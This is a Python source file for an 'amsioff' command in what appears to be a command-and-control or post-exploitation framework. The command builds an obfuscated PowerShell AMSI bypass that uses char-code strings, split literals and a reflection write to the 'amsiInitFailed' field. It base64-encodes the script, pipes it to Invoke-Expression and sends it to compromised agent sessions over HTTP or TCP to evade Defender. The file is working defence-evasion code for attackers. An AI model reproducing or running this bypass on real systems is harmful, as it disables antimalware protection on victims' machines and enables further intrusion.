from core.gunnershell.commands.base import register, Command
from core.session_handlers import session_manager
import base64

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"

@register("amsioff")
class AmsioffCommand(Command):
	"""Disable AMSI in-memory: amsioff"""

	@property
	def help(self):
		return "amsioff    Bypass AMSI"

	def execute(self, args):
		out = self.logic(self.gs.sid, self.gs.os_type, op_id=self.op_id)
		if out:
			print(brightgreen + out)

	def logic(self, sid, os_type, op_id="console"):
		"""
		Disable AMSI in‑memory via reflection bypass.
		"""
		display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
		if "windows" not in os_type:
			return brightyellow + "[*] amsioff only supported on Windows"

		# your one‑liner, wrapped for base64‑UTF16LE
		raw_ps = f"""
$e=[Ref].('Assem'+'bly').GetType(([string]::Join('', [char[]](
	83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,
	116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,
	105,85,116,105,108,115
))))
$n='Non'+'Public'; $s='Static'
$f=$e.GetField(
	([string]::Join('', [char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100))),
	"$n,$s"
)
$t=[type[]]@([object],[bool])
$m=$f.GetType().GetMethod('Set'+'Value',$t)
$test = ($m.Invoke($f,@($null,$true)))

if (-not $test) {{ Write-Output "Success" }} else {{ Write-Output "Nothing Found" }}
"""
		b64 = base64.b64encode(raw_ps.encode('utf-16le')).decode()
		ps_cmd = "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"" + b64 + "\")) | Invoke-Expression"

		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + f"[!] No such session: {display}"

		transport = sess.transport.lower()

		# dispatch (bypassing defender)
		if transport in ("http","https"):
			out = http_exec.run_command_http(sid, ps_cmd, op_id=op_id)

		elif transport in ("tcp", "tls"):
			out = tcp_exec.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

		else:
			return brightred + "[!] Unknown session transport!"

		if out:
			if "Nothing Found" in out:
				return brightred + f"[!] Failed to bypass AMSI!"

			elif "Success" in out:
				return "[+] Successfully bypassed AMSI."

			else:
				return brightred + "[!] An error ocurred on agent!"